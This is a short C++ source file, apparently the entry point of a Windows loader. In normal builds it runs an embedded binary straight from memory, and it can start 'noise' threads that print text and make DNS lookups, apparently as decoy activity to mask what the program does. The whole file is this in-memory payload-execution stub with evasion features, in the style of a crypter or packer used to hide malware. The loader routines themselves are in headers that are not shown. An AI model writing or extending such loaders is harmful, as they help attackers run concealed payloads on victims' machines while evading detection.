#include <string>
#include <iostream>
#include <thread>

#include <windows.h>
#include <loader.hpp>

#ifndef _GERNIG_DEBUG
#include <binexp.h>
#include <defines.h>
#endif

#include <modules/print.hpp>
#include <modules/dns.hpp>

int main(int argc, char **argv)
{
#ifdef _PRINT_NOISE_ENABLED
    std::thread printThread(printLoop, _PRINT_NOISE_TEXT);
#endif

#ifdef _DNS_NOISE_ENABLED
    std::thread dnsThread(getHostByName, _DNS_NOISE_ARG);
#endif

#ifndef _GERNIG_DEBUG
    LoadFromMemory(&BINARY_ARRAY, sizeof(BINARY_ARRAY));
#else
    LoadFromFile(argv[1]);
#endif

    return 0;
}
